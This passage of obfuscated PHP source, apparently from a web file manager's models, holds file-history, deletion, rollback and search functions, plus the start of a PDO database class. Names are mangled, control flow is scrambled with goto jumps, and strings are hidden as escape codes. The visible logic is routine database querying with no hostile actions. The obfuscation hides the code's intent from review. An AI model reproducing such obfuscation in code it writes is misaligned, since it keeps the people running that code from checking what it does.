$e»Ä §‹ø = Model($a’Ü¼©„¢Ã[494])->userListInfo($Eã„õŞñ»Ê); foreach ($e…¢ùÚ˜ä as &$eé‹™†Æ—) { $eˆ±‘Õº = $eé‹™†Æ—[$a’Ü¼©„¢Ã[1485]]; $eé‹™†Æ—[$a’Ü¼©„¢Ã[394]] = $e»Ä §‹ø[$eˆ±‘Õº] ? $e»Ä §‹ø[$eˆ±‘Õº] : !1; } unset($eé‹™†Æ—); } public function fileInfo($b‘§êÁ¡š™) { $fà­Àø¤ğµ =& $_SERVER[úÎü]; $CøÀŠ¦Íï‹ = $this->tablePrefix; $F¾¡Ã™¶É³ = "{$CøÀŠ¦Íï‹}\151\157\137\146\151\154\x65\x20\x66\x69\x6c\145\163\x20\157\x6e\x20\146\x69\154\145\x73\x2e\x66\151\154\x65\x49\x44\x20\x3d\40\150\151\163\164\x6f\162\171\56\146\151\x6c\x65\x49\104"; return $this->alias($fà­Àø¤ğµ[1883])->where(array($fà­Àø¤ğµ[401] => $b‘§êÁ¡š™))->join($F¾¡Ã™¶É³, $fà­Àø¤ğµ[1884])->find(); } public function removeItem($Bƒ‹é÷Ñİ´) { $bÜ•ÕÚÜ =& $_SERVER[úÎü]; $dø„¬‡‚Ö = array($bÜ•ÕÚÜ[401] => $Bƒ‹é÷Ñİ´); $fàöŸø´¬¬ = $this->where($dø„¬‡‚Ö)->find(); if ($fàöŸø´¬¬) { $Eßã“©„ãÎ = $this->where($dø„¬‡‚Ö)->delete(); Model($bÜ•ÕÚÜ[438])->remove($fàöŸø´¬¬[$bÜ•ÕÚÜ[435]]); return $Eßã“©„ãÎ; } return !1; } public function removeBySource($EëæŠÖº•‰) { goto CĞˆÑŠùŒ¸; CĞˆÑŠùŒ¸: $Cˆà±ïğ±™ =& $_SERVER[úÎü]; if (!$EëæŠÖº•‰) { return !1; } if (!is_array($EëæŠÖº•‰)) { $EëæŠÖº•‰ = array($EëæŠÖº•‰); } goto a¢—Áã¶Å™; aÑºÄ”éîğ: return !0; goto EÃ¬ì¢ø½İ; a¢—Áã¶Å™: $d‰™ĞßÎ“ = array($Cˆà±ïğ±™[399] => array($Cˆà±ïğ±™[7], $EëæŠÖº•‰)); $fâ§Ñç¦ = $this->field($Cˆà±ïğ±™[436])->where($d‰™ĞßÎ“)->select(); if ($fâ§Ñç¦) { $this->where($d‰™ĞßÎ“)->delete(); $eã­…ø¼ = array_to_keyvalue($fâ§Ñç¦, $Cˆà±ïğ±™[33], $Cˆà±ïğ±™[435]); Model($Cˆà±ïğ±™[438])->remove($eã­…ø¼); } goto aÑºÄ”éîğ; EÃ¬ì¢ø½İ: } public function setDetail($B…›£‹õ§Ú, $AšİÚ¦°’˜) { $bê¹™÷Ø =& $_SERVER[úÎü]; return $this->where(array($bê¹™÷Ø[401] => $B…›£‹õ§Ú))->save(array($bê¹™÷Ø[1874] => $AšİÚ¦°’˜)); } public function rollbackToItem($E­Í„ã˜†ß, $F™‚¡¹ÃÑó) { goto BÛÔ¤¢ÓÁ”; C„“Êµ³: return $this->where(array($A„‡†ˆ[401] => $F™‚¡¹ÃÑó))->delete(); goto CÇôƒ×½; BÛÔ¤¢ÓÁ”: $A„‡†ˆ =& $_SERVER[úÎü]; $cà©á’Ş¶› = Model($A„‡†ˆ[752])->sourceInfo($E­Í„ã˜†ß); $this->addHistory($cà©á’Ş¶›, LNG($A„‡†ˆ[1885])); goto E«ƒâÚÉµ; E«ƒâÚÉµ: $EˆË½æ›«¯ = $this->find($F™‚¡¹ÃÑó); $BŒ´•ÅŞÓ¿ = array($A„‡†ˆ[435] => $EˆË½æ›«¯[$A„‡†ˆ[435]], $A„‡†ˆ[77] => $EˆË½æ›«¯[$A„‡†ˆ[77]], $A„‡†ˆ[107] => time(), $A„‡†ˆ[395] => USER_ID); Model($A„‡†ˆ[752])->where(array($A„‡†ˆ[385] => $E­Í„ã˜†ß))->save($BŒ´•ÅŞÓ¿); goto C„“Êµ³; CÇôƒ×½: } public function clearSame($B—ğàÜé) { goto bê¥Í°Ñ; bê¥Í°Ñ: $Bµ²Úˆ‰§× =& $_SERVER[úÎü]; $C—»î‡ô¦¢ = $this->listData($B—ğàÜé); $Dåµ·½ößâ = array_to_keyvalue_group($C—»î‡ô¦¢, $Bµ²Úˆ‰§×[435]); goto E®æÌ´†ƒ‚; dàŞÉ–Ğ¿: if (!$fˆñ÷ÑÒ›) { return; } $this->where(array($Bµ²Úˆ‰§×[383] => array($Bµ²Úˆ‰§×[7], $fˆñ÷ÑÒ›)))->delete(); Model($Bµ²Úˆ‰§×[438])->remove($BÀÎÓÉæ÷Œ); goto F¦¹“¸çĞ­; E®æÌ´†ƒ‚: $BÀÎÓÉæ÷Œ = array(); $fˆñ÷ÑÒ› = array(); foreach ($Dåµ·½ößâ as $E¦Œ“Â¤Ÿ) { if (!$E¦Œ“Â¤Ÿ || count($E¦Œ“Â¤Ÿ) <= 1) { continue; } foreach ($E¦Œ“Â¤Ÿ as $c†Øâ…®§’) { $BÀÎÓÉæ÷Œ[] = $c†Øâ…®§’[$Bµ²Úˆ‰§×[435]]; $fˆñ÷ÑÒ›[] = $c†Øâ…®§’[$Bµ²Úˆ‰§×[383]]; } } goto dàŞÉ–Ğ¿; F¦¹“¸çĞ­: } public function userSpace() { $d„¡‚à×å  =& $_SERVER[úÎü]; $d™‘ˆ×ò£õ = $this->tablePrefix; $cèâË®Ğ„¿ = array($d„¡‚à×å [1477] => USER_ID); $AßÒñ¨Â²É = "{$d™‘ˆ×ò£õ}\151\x6f\x5f\146\x69\x6c\145\x20\x66\151\x6c\x65\163\x20\157\x6e\x20\146\151\154\x65\x73\x2e\x66\151\x6c\x65\111\104\40\x3d\40\x68\x69\x73\x74\x6f\x72\x79\x2e\x66\151\154\145\111\x44"; return $this->alias($d„¡‚à×å [1883])->where($cèâË®Ğ„¿)->join($AßÒñ¨Â²É, $d„¡‚à×å [1884])->sum($d„¡‚à×å [77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($EŞ„…‘øæ) { goto C»‹ËÖÅ”Á; FÍÖƒ•ò£–: if (!$Aèµ—ôÄÎ) { return array(); } $E÷æ„ÛŒØ = $Aèµ—ôÄÎ[$c÷½–ó®°ø[165]]; $d¿ê‹å™å = $c÷½–ó®°ø[7]; goto dõ•²¯š·; C»‹ËÖÅ”Á: $c÷½–ó®°ø =& $_SERVER[úÎü]; $DîÎéŠÕŠ» = KodIO::fileTypeList(); $Aèµ—ôÄÎ = $DîÎéŠÕŠ»[$EŞ„…‘øæ]; goto FÍÖƒ•ò£–; dõ•²¯š·: if (!$Aèµ—ôÄÎ[$c÷½–ó®°ø[165]]) { $F¹‰”æ»Ïí = array_to_keyvalue($DîÎéŠÕŠ», $c÷½–ó®°ø[33], $c÷½–ó®°ø[165]); $E÷æ„ÛŒØ = implode($c÷½–ó®°ø[47], $F¹‰”æ»Ïí); $d¿ê‹å™å = $c÷½–ó®°ø[1886]; } $B ã°¥å£ = explode($c÷½–ó®°ø[47], trim($E÷æ„ÛŒØ, $c÷½–ó®°ø[47])); return array($d¿ê‹å™å, $B ã°¥å£); goto eÆƒ×†Â›ì; eÆƒ×†Â›ì: } public function listPathType($E¼Ï¯²Š) { $b‚íç¾¬×Ì =& $_SERVER[úÎü]; $bËË‡œã§— = $this->fileTypeWhere($E¼Ï¯²Š); if (!$bËË‡œã§—) { return array(); } $e‹æ…’†Ä = array($b‚íç¾¬×Ì[538] => SourceModel::TYPE_USER, $b‚íç¾¬×Ì[539] => USER_ID, $b‚íç¾¬×Ì[535] => 0, $b‚íç¾¬×Ì[536] => $bËË‡œã§—); return $this->listSource($e‹æ…’†Ä); } public function listSearch($A‰¿º¸ÖÄ, $c‹÷®âÂŞ = 300) { goto BØâ„á„Õ÷; cÜ†×Ü‡ÊÄ: $this->_listSearchBindPinyin($A‰¿º¸ÖÄ, $A´²ìµÉ³², $Bà±ïÇõ¦²); $this->alias($b§ââ‰é™Ï[504])->_makeOrder(); $A´²ìµÉ³² = $this->parseWhereLike($A´²ìµÉ³²); goto AŞ ·Œ; E§‘Ù©¡¹Á: $this->_listSearchGroupTag($b®’„»ã‚º, $A‰¿º¸ÖÄ, $A‰î”Ü™ë…); $this->_listDataApply($b®’„»ã‚º[$b§ââ‰é™Ï[361]]); $this->_listMake($b®’„»ã‚º); goto C…©î°ˆÈ”; AŞ ·Œ: $b®’„»ã‚º = $this->distinct(!0)->field($Bà±ïÇõ¦²)->where($A´²ìµÉ³²)->selectPage($c‹÷®âÂŞ); $this->_listSearchDesc($b®’„»ã‚º, $A‰¿º¸ÖÄ, $A‰î”Ü™ë…); $this->_listSearchTag($b®’„»ã‚º, $A‰¿º¸ÖÄ, $A‰î”Ü™ë…); goto E§‘Ù©¡¹Á; BØâ„á„Õ÷: $b§ââ‰é™Ï =& $_SERVER[úÎü]; if (isset($A‰¿º¸ÖÄ[$b§ââ‰é™Ï[1729]]) && $A‰¿º¸ÖÄ[$b§ââ‰é™Ï[1729]]) { $A‰¿º¸ÖÄ[$b§ââ‰é™Ï[1729]] = str_replace($b§ââ‰é™Ï[374], $b§ââ‰é™Ï[1887], trim($A‰¿º¸ÖÄ[$b§ââ‰é™Ï[1729]])); } $A´²ìµÉ³² = $this->_parseSearchWhere($A‰¿º¸ÖÄ); goto CÔÇ°œÕÀ; CÔÇ°œÕÀ: if (!isset($A´²ìµÉ³²[$b§ââ‰é™Ï[413]])) { $A´²ìµÉ³²[$b§ââ‰é™Ï[413]] = 0; } $Bà±ïÇõ¦² = $b§ââ‰é™Ï[1888]; $A‰î”Ü™ë… = $Bà±ïÇõ¦²; goto cÜ†×Ü‡ÊÄ; C…©î°ˆÈ”: return $b®’„»ã‚º; goto CÉôÍÒ½¢ç; CÉôÍÒ½¢ç: } private function _listSearchTag(&$BŠÖ¥ß ­ª, $E›ÆêíòˆÕ, $E¹¨äÆ ¬ƒ) { goto fËø…º…Á³; f±Ò˜ÃáœÁ: if (!$B¿–˜ŞˆœĞ) { return; } $E®‘³ã¿¦š = array($F³ˆ«¡³ø[409] => array($F³ˆ«¡³ø[7], $B¿–˜ŞˆœĞ), $F³ˆ«¡³ø[1485] => USER_ID); $e´ØÁ®´ÕÁ = Model($F³ˆ«¡³ø[410])->field($F³ˆ«¡³ø[75])->where($E®‘³ã¿¦š)->select(); goto c‹Å±Ø¡ÇÌ; c‹Å±Ø¡ÇÌ: $e´ØÁ®´ÕÁ = array_to_keyvalue($e´ØÁ®´ÕÁ, $F³ˆ«¡³ø[33], $F³ˆ«¡³ø[75]); $E÷©×ŞÒÑ = array_unique($e´ØÁ®´ÕÁ); $this->_listSearchMerge($BŠÖ¥ß ­ª, $E›ÆêíòˆÕ, $E¹¨äÆ ¬ƒ, $E÷©×ŞÒÑ); goto fÈĞâæÒ±À; A¬ßò¸«¡í: $B¿–˜ŞˆœĞ = array(); $AÕÅ‘®„í = $E›ÆêíòˆÕ[$F³ˆ«¡³ø[1729]]; foreach ($C®ñ¿Ç£§‰ as $fİÁÙåõÌ–) { $fˆÁ­¸ï‡Ñ = $fİÁÙåõÌ–[$F³ˆ«¡³ø[28]]; $B›ÈÙö = str_replace($F³ˆ«¡³ø[50], $F³ˆ«¡³ø[33], Pinyin::encode($fˆÁ­¸ï‡Ñ)); if (stripos($fˆÁ­¸ï‡Ñ, $AÕÅ‘®„í) !== !1 || stripos($B›ÈÙö, $AÕÅ‘®„í) !== !1) { $B¿–˜ŞˆœĞ[] = $fİÁÙåõÌ–[$F³ˆ«¡³ø[383]]; } } goto f±Ò˜ÃáœÁ; fËø…º…Á³: $F³ˆ«¡³ø =& $_SERVER[úÎü]; if (!$E›ÆêíòˆÕ[$F³ˆ«¡³ø[1729]] || $BŠÖ¥ß ­ª[$F³ˆ«¡³ø[358]][$F³ˆ«¡³ø[347]] > 1) { return; } $C®ñ¿Ç£§‰ = Model($F³ˆ«¡³ø[1889])->listData(); goto A¬ßò¸«¡í; fÈĞâæÒ±À: } private function _listSearchDesc(&$C¥››­…Õ, $DÖ¹£÷ò˜, $B’â—´ĞÎá) { goto e‚ğ„è„×ó; CŠµç¦ø: $D”†×Ú¿ñù = array_unique($D”†×Ú¿ñù); if (!$D”†×Ú¿ñù) { return; } $B†ÁŒçòàµ = array($A¾„ŞµÕŒ¤[385] => array($A¾„ŞµÕŒ¤[7], $D”†×Ú¿ñù), $A¾„ŞµÕŒ¤[89] => $A¾„ŞµÕŒ¤[421], $A¾„ŞµÕŒ¤[366] => array($A¾„ŞµÕŒ¤[373], $A¾„ŞµÕŒ¤[1731] . $DÖ¹£÷ò˜[$A¾„ŞµÕŒ¤[1729]] . $A¾„ŞµÕŒ¤[1731])); goto DËãˆ­ØÂš; e‚ğ„è„×ó: $A¾„ŞµÕŒ¤ =& $_SERVER[úÎü]; if (!$DÖ¹£÷ò˜[$A¾„ŞµÕŒ¤[1729]] || $C¥››­…Õ[$A¾„ŞµÕŒ¤[358]][$A¾„ŞµÕŒ¤[347]] > 1) { return; } $D”†×Ú¿ñù = $this->listSearchChildren($DÖ¹£÷ò˜[$A¾„ŞµÕŒ¤[478]]); goto CŠµç¦ø; DËãˆ­ØÂš: $fˆ°„£ïœ = Model($A¾„ŞµÕŒ¤[521])->field($A¾„ŞµÕŒ¤[385])->where($B†ÁŒçòàµ)->select(); $AºĞñ§å² = array_to_keyvalue($fˆ°„£ïœ, $A¾„ŞµÕŒ¤[33], $A¾„ŞµÕŒ¤[385]); $this->_listSearchMerge($C¥››­…Õ, $DÖ¹£÷ò˜, $B’â—´ĞÎá, $AºĞñ§å²); goto A»î’ÛŞ³Œ; A»î’ÛŞ³Œ: } private function _listSearchGroupTag(&$Dæª©¨ÈÉ§, $Cùïï¡“‡, $D´ëÕÇØĞ÷) { goto Dˆ»ÄÑù; Dˆ»ÄÑù: $EÕºù¿¶¦ =& $_SERVER[úÎü]; if (!$Cùïï¡“‡[$EÕºù¿¶¦[1729]] || $Dæª©¨ÈÉ§[$EÕºù¿¶¦[358]][$EÕºù¿¶¦[347]] > 1 || !$Cùïï¡“‡[$EÕºù¿¶¦[478]]) { return; } $eÅÔ®µöÀ = $this->sourceInfo($Cùïï¡“‡[$EÕºù¿¶¦[478]]); goto Fç‘Á˜¤…; D‚ÍÉ§ò›: $f¸İùãõ = array_to_keyvalue($f¸İùãõ, $EÕºù¿¶¦[33], $EÕºù¿¶¦[75]); $aÆ’¦÷‘×¬ = array_unique($f¸İùãõ); $this->_listSearchMerge($Dæª©¨ÈÉ§, $Cùïï¡“‡, $D´ëÕÇØĞ÷, $aÆ’¦÷‘×¬); goto fˆô°Îù”; bƒ‰‘è¿ê: if (!$FÊî­Ååêš) { return; } $bÒïÌ÷ÂÆ… = array($EÕºù¿¶¦[409] => array($EÕºù¿¶¦[7], $FÊî­Ååêš), $EÕºù¿¶¦[1485] => 0, $EÕºù¿¶¦[29] => $EÕºù¿¶¦[1749] . $BÓŸ«ƒò); $f¸İùãõ = Model($EÕºù¿¶¦[410])->field($EÕºù¿¶¦[75])->where($bÒïÌ÷ÂÆ…)->select(); goto D‚ÍÉ§ò›; aõÁ£´°´: $FÊî­Ååêš = array(); $b”çĞ‹‚Øß = $Cùïï¡“‡[$EÕºù¿¶¦[1729]]; foreach ($F½ÎÔÛè–í[$EÕºù¿¶¦[361]] as $b½íê±˜é) { $E‡òŸ·„š = $b½íê±˜é[$EÕºù¿¶¦[28]]; $BÈÆ½‰â³ = str_replace($EÕºù¿¶¦[50], $EÕºù¿¶¦[33], Pinyin::encode($E‡òŸ·„š)); if (stripos($E‡òŸ·„š, $b”çĞ‹‚Øß) !== !1 || stripos($BÈÆ½‰â³, $b”çĞ‹‚Øß) !== !1) { $FÊî­Ååêš[] = $b½íê±˜é[$EÕºù¿¶¦[383]]; } } goto bƒ‰‘è¿ê; Fç‘Á˜¤…: if (!$eÅÔ®µöÀ || $eÅÔ®µöÀ[$EÕºù¿¶¦[387]] != SourceModel::TYPE_GROUP) { return; } $BÓŸ«ƒò = $eÅÔ®µöÀ[$EÕºù¿¶¦[473]]; $F½ÎÔÛè–í = Model($EÕºù¿¶¦[1890])->get($BÓŸ«ƒò); goto aõÁ£´°´; fˆô°Îù”: } private function _listSearchMerge(&$CµÄ¬Š–’«, $C©™´ÌÒÑ, $f‰ôĞŠÈËá, $Eù²³µ¤ƒ’) { goto d¬”Ğ¨®¡¦; d¬”Ğ¨®¡¦: $c¥ºÜîÅ¨“ =& $_SERVER[úÎü]; if (!$Eù²³µ¤ƒ’) { return; } $c‡íÔÔØÙ = array_to_keyvalue($CµÄ¬Š–’«[$c¥ºÜîÅ¨“[361]], $c¥ºÜîÅ¨“[33], $c¥ºÜîÅ¨“[385]); goto bÅ à¦ç®ø; b’´ÆÚ: foreach ($E§¾Ã¦‚› as $få¤ïš²¹Ë) { $eÌÜŸöÉØˆ = $c¥ºÜîÅ¨“[47] . $C©™´ÌÒÑ[$c¥ºÜîÅ¨“[478]] . $c¥ºÜîÅ¨“[47]; if (stripos($få¤ïš²¹Ë[$c¥ºÜîÅ¨“[476]], $eÌÜŸöÉØˆ) !== !1) { $F­¹°·ŠÉ¾[] = $få¤ïš²¹Ë; } } $CµÄ¬Š–’«[$c¥ºÜîÅ¨“[361]] = array_merge($F­¹°·ŠÉ¾, $CµÄ¬Š–’«[$c¥ºÜîÅ¨“[361]]); $CµÄ¬Š–’«[$c¥ºÜîÅ¨“[358]][$c¥ºÜîÅ¨“[359]] += count($F­¹°·ŠÉ¾); goto F¥Š¦º¶àê; Fèèº’æ: $E§¾Ã¦‚› = $this->field($f‰ôĞŠÈËá)->where($bÒÁ…ÚêÎ)->select(); if (!$E§¾Ã¦‚›) { return; } $F­¹°·ŠÉ¾ = array(); goto b’´ÆÚ; bÅ à¦ç®ø: $b±ŞØ‡È¢ = array_diff($Eù²³µ¤ƒ’, $c‡íÔÔØÙ); if (!$b±ŞØ‡È¢) { return; } $bÒÁ…ÚêÎ = array($c¥ºÜîÅ¨“[385] => array($c¥ºÜîÅ¨“[7], $b±ŞØ‡È¢)); goto Fèèº’æ; F¥Š¦º¶àê: } public function listSearchChildren($dÓ‰´–…Åê, $eá¼Ò· ®¢ = 5000) { goto e«Å—–¤”Ì; e«Å—–¤”Ì: $DÃ³­¨Öè¢ =& $_SERVER[úÎü]; $D³‡Ç¬†§ = array(); $F”¹¬ø¨‚î = $this->sourceInfo($dÓ‰´–…Åê); goto dÒ‡Ñƒ‹÷; B¿œ°¯Ç£ß: $d•·ø£¢àÃ = $this->field($DÃ³­¨Öè¢[385])->where($EÛÇ™°ÆÚ)->select(); $D³‡Ç¬†§ = array_to_keyvalue($d•·ø£¢àÃ, $DÃ³­¨Öè¢[33], $DÃ³­¨Öè¢[385]); return $D³‡Ç¬†§; goto EàŸË´¯¿è; dÒ‡Ñƒ‹÷: $EÛÇ™°ÆÚ = array($DÃ³­¨Öè¢[476] => array($DÃ³­¨Öè¢[373], $F”¹¬ø¨‚î[$DÃ³­¨Öè¢[476]] . $F”¹¬ø¨‚î[$DÃ³­¨Öè¢[385]] . $DÃ³­¨Öè¢[501])); $CÛÅÈŒÖŒ» = $this->field($DÃ³­¨Öè¢[385])->cache(null, 600)->where($EÛÇ™°ÆÚ)->count(); if ($CÛÅÈŒÖŒ» > $eá¼Ò· ®¢) { return $this->_listSearchChildrenNear($dÓ‰´–…Åê, $eá¼Ò· ®¢); } goto B¿œ°¯Ç£ß; EàŸË´¯¿è: } private function _listSearchChildrenNear($dôÍ˜ÙÕƒô, $bËÈ¥»¬) { goto CíåÊÇ¡»; CíåÊÇ¡»: $cá¤—‹ï·Ğ =& $_SERVER[úÎü]; $a†‹ë©ëíÂ = array(); $CŞ†ô—±Ê = array($cá¤—‹ï·Ğ[478] => $dôÍ˜ÙÕƒô); goto Cˆ§ •êÃ; bÎÚ”ÚÑ²ù: if (!$C¶‹Û¾ à) { return $a†‹ë©ëíÂ; } $CŞ†ô—±Ê = array($cá¤—‹ï·Ğ[478] => array($cá¤—‹ï·Ğ[7], $C¶‹Û¾ à)); $AÏŠÇù¸¬ = $this->field($cá¤—‹ï·Ğ[1891])->where($CŞ†ô—±Ê)->limit($bËÈ¥»¬)->select(); goto f×ë‹¯§®“; f×ë‹¯§®“: $a†‹ë©ëíÂ = array_merge($a†‹ë©ëíÂ, array_to_keyvalue($AÏŠÇù¸¬, $cá¤—‹ï·Ğ[33], $cá¤—‹ï·Ğ[385])); $a†‹ë©ëíÂ = array_slice($a†‹ë©ëíÂ, 0, $bËÈ¥»¬); return $a†‹ë©ëíÂ; goto fÊß¦ª±àŒ; Cˆ§ •êÃ: $AÏŠÇù¸¬ = $this->field($cá¤—‹ï·Ğ[1891])->where($CŞ†ô—±Ê)->select(); $C¶‹Û¾ à = array_to_keyvalue(array_filter_by_field($AÏŠÇù¸¬, $cá¤—‹ï·Ğ[386], $cá¤—‹ï·Ğ[83]), $cá¤—‹ï·Ğ[33], $cá¤—‹ï·Ğ[385]); $a†‹ë©ëíÂ = array_merge($a†‹ë©ëíÂ, array_to_keyvalue($AÏŠÇù¸¬, $cá¤—‹ï·Ğ[33], $cá¤—‹ï·Ğ[385])); goto bÎÚ”ÚÑ²ù; fÊß¦ª±àŒ: } private function _listSearchBindPinyin($a‹®§ ÷, &$a–òÌŠš†Ç, &$EĞ‘› ÷ºŞ) { goto bÚ±§ÆÍÜ; bÉñ«åïÄ: $EÂˆÄÕÎ = $a–òÌŠš†Ç[$AÒ±ÓÏ¤÷ê[28]]; unset($a–òÌŠš†Ç[$AÒ±ÓÏ¤÷ê[28]]); foreach ($a–òÌŠš†Ç as $f×¥¦â’³Œ => $Cª­´†œ‡Û) { $b®»É…øÊ‰[$AÒ±ÓÏ¤÷ê[1893] . $f×¥¦â’³Œ] = $Cª­´†œ‡Û; } goto aÒªµŒ„æÆ; aÒªµŒ„æÆ: foreach ($EÂˆÄÕÎ as $D°ÂÖ¹‹›) { $b®»É…øÊ‰[] = array($AÒ±ÓÏ¤÷ê[1895] => $D°ÂÖ¹‹›, $AÒ±ÓÏ¤÷ê[918] => $AÒ±ÓÏ¤÷ê[1733], array($AÒ±ÓÏ¤÷ê[1896] => $D°ÂÖ¹‹›, $AÒ±ÓÏ¤÷ê[1897] => array($AÒ±ÓÏ¤÷ê[7], array($AÒ±ÓÏ¤÷ê[432], $AÒ±ÓÏ¤÷ê[431])))); } $this->join($EÃ…Ù§…¸˜); $a–òÌŠš†Ç = $b®»É…øÊ‰; goto d‚‘¢³Û‚Ú; e©èø˜…¹—: $b®»É…øÊ‰ = array(); $EĞ‘› ÷ºŞ = str_replace(array($AÒ±ÓÏ¤÷ê[225], $AÒ±ÓÏ¤÷ê[50], $AÒ±ÓÏ¤÷ê[1892]), $AÒ±ÓÏ¤÷ê[33], $EĞ‘› ÷ºŞ); $EĞ‘› ÷ºŞ = $AÒ±ÓÏ¤÷ê[1893] . str_replace($AÒ±ÓÏ¤÷ê[47], $AÒ±ÓÏ¤÷ê[1894], $EĞ‘› ÷ºŞ); goto bÉñ«åïÄ; bÚ±§ÆÍÜ: $AÒ±ÓÏ¤÷ê =& $_SERVER[úÎü]; if (!Input::check($a‹®§ ÷[$AÒ±ÓÏ¤÷ê[1729]], $AÒ±ÓÏ¤÷ê[312]) || strlen($a‹®§ ÷[$AÒ±ÓÏ¤÷ê[1729]]) < 2) { return; } $EÃ…Ù§…¸˜ = "\114\105\106\x54\40\x4a\117\111\x4e\40{$this->tablePrefix}\151\157\x5f\x73\x6f\x75\x72\143\x65\x5f\x6d\x65\164\x61\x20\x6d\x65\164\x61\x20\157\156\40\163\x6f\165\x72\143\x65\x2e\x73\x6f\165\162\143\x65\x49\104\x20\x3d\40\x6d\x65\164\x61\x2e\163\x6f\165\162\x63\x65\111\x44"; goto e©èø˜…¹—; d‚‘¢³Û‚Ú: } private function _parseSearchWhere($eƒê”ÂªßÍ) { goto BîĞ´‡Ì; BµÈé´: if (isset($eƒê”ÂªßÍ[$aöÎ–§ÈÁ[464]])) { $F°¹šø°‰º = array($aöÎ–§ÈÁ[1899], $eƒê”ÂªßÍ[$aöÎ–§ÈÁ[464]]); if ($Dã¶¤Íäè”[$aöÎ–§ÈÁ[107]]) { $Dã¶¤Íäè”[$aöÎ–§ÈÁ[107]] = array($Dã¶¤Íäè”[$aöÎ–§ÈÁ[107]], $F°¹šø°‰º, $aöÎ–§ÈÁ[1900]); } else { $Dã¶¤Íäè”[$aöÎ–§ÈÁ[107]] = $F°¹šø°‰º; } } if (isset($eƒê”ÂªßÍ[$aöÎ–§ÈÁ[1901]])) { $Dã¶¤Íäè”[$aöÎ–§ÈÁ[77]] = array($aöÎ–§ÈÁ[1898], $eƒê”ÂªßÍ[$aöÎ–§ÈÁ[1901]]); } if (isset($eƒê”ÂªßÍ[$aöÎ–§ÈÁ[1902]])) { $F°¹šø°‰º = array($aöÎ–§ÈÁ[1899], $eƒê”ÂªßÍ[$aöÎ–§ÈÁ[1902]]); if ($Dã¶¤Íäè”[$aöÎ–§ÈÁ[77]]) { $Dã¶¤Íäè”[$aöÎ–§ÈÁ[77]] = array($Dã¶¤Íäè”[$aöÎ–§ÈÁ[77]], $F°¹šø°‰º, $aöÎ–§ÈÁ[1900]); } else { $Dã¶¤Íäè”[$aöÎ–§ÈÁ[77]] = $F°¹šø°‰º; } } goto e‚¯ê£ïî; bÂ¸†öÅ: if (isset($eƒê”ÂªßÍ[$aöÎ–§ÈÁ[1729]]) && $eƒê”ÂªßÍ[$aöÎ–§ÈÁ[1729]]) { $b»‹ÃÑŞ¯ = $eƒê”ÂªßÍ[$aöÎ–§ÈÁ[1729]]; $AØ‚ìâŒÕÆ = explode($aöÎ–§ÈÁ[50], $b»‹ÃÑŞ¯); if (strlen($b»‹ÃÑŞ¯) > 2 && (substr($b»‹ÃÑŞ¯, 0, 1) == $aöÎ–§ÈÁ[113] && substr($b»‹ÃÑŞ¯, -1) == $aöÎ–§ÈÁ[113]) || substr($b»‹ÃÑŞ¯, 0, 1) == $aöÎ–§ÈÁ[55] && substr($b»‹ÃÑŞ¯, -1) == $aöÎ–§ÈÁ[55]) { $b»‹ÃÑŞ¯ = substr($b»‹ÃÑŞ¯, 1, -1); $AØ‚ìâŒÕÆ = array($b»‹ÃÑŞ¯); } $Dã¶¤Íäè”[$aöÎ–§ÈÁ[28]] = array(array($aöÎ–§ÈÁ[500], $aöÎ–§ÈÁ[1731] . $b»‹ÃÑŞ¯ . $aöÎ–§ÈÁ[1731])); if (count($AØ‚ìâŒÕÆ) > 1) { $Dã¶¤Íäè”[$aöÎ–§ÈÁ[28]] = array(); foreach ($AØ‚ìâŒÕÆ as $cÓ§ÄÆ‚ğÛ) { if (!trim($cÓ§ÄÆ‚ğÛ)) { continue; } $Dã¶¤Íäè”[$aöÎ–§ÈÁ[28]][] = array($aöÎ–§ÈÁ[500], $aöÎ–§ÈÁ[1731] . trim($cÓ§ÄÆ‚ğÛ) . $aöÎ–§ÈÁ[1731]); } } } return $Dã¶¤Íäè”; goto dŒËÚøË§Ú; BîĞ´‡Ì: $aöÎ–§ÈÁ =& $_SERVER[úÎü]; $Dã¶¤Íäè” = array(); if (isset($eƒê”ÂªßÍ[$aöÎ–§ÈÁ[703]])) { $Dã¶¤Íäè”[$aöÎ–§ÈÁ[107]] = array($aöÎ–§ÈÁ[1898], $eƒê”ÂªßÍ[$aöÎ–§ÈÁ[703]]); } goto BµÈé´; e‚¯ê£ïî: if (isset($eƒê”ÂªßÍ[$aöÎ–§ÈÁ[551]])) { $Dã¶¤Íäè”[] = array($aöÎ–§ÈÁ[395] => $eƒê”ÂªßÍ[$aöÎ–§ÈÁ[551]], $aöÎ–§ÈÁ[394] => $eƒê”ÂªßÍ[$aöÎ–§ÈÁ[551]], $aöÎ–§ÈÁ[918] => $aöÎ–§ÈÁ[1733]); } if (isset($eƒê”ÂªßÍ[$aöÎ–§ÈÁ[388]])) { $FÀÎÎàí“ô = $eƒê”ÂªßÍ[$aöÎ–§ÈÁ[388]]; if ($FÀÎÎàí“ô == $aöÎ–§ÈÁ[76]) { $Dã¶¤Íäè”[$aöÎ–§ÈÁ[386]] = 1; } else { if ($FÀÎÎàí“ô == $aöÎ–§ÈÁ[1903]) { $Dã¶¤Íäè”[$aöÎ–§ÈÁ[386]] = 0; } else { if ($FÀÎÎàí“ô) { $FÀÎÎàí“ô = is_array($FÀÎÎàí“ô) ? $FÀÎÎàí“ô : explode($aöÎ–§ÈÁ[47], $FÀÎÎàí“ô); $Dã¶¤Íäè”[$aöÎ–§ÈÁ[388]] = array($aöÎ–§ÈÁ[400], $FÀÎÎàí“ô); $Dã¶¤Íäè”[$aöÎ–§ÈÁ[386]] = 0; } } } } if (isset($eƒê”ÂªßÍ[$aöÎ–§ÈÁ[478]])) { $d¨–ê¢âä = $this->sourceInfo($eƒê”ÂªßÍ[$aöÎ–§ÈÁ[478]]); $Dã¶¤Íäè”[$aöÎ–§ÈÁ[542]] = array($aöÎ–§ÈÁ[500], $d¨–ê¢âä[$aöÎ–§ÈÁ[476]] . $eƒê”ÂªßÍ[$aöÎ–§ÈÁ[478]] . $aöÎ–§ÈÁ[501]); } goto bÂ¸†öÅ; dŒËÚøË§Ú: } } goto Bïª…Ğæï ; D’‰Âååß‹: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($DøÓŞø°ô× = '') { $FÉñÇ—·¬¾ =& $_SERVER[úÎü]; if (!class_exists($FÉñÇ—·¬¾[834])) { think_exception(think_lang($FÉñÇ—·¬¾[10]) . $FÉñÇ—·¬¾[835]); } if (!empty($DøÓŞø°ô×)) { $this->config = $DøÓŞø°ô×; if (empty($this->config[$FÉñÇ—·¬¾[13]])) { 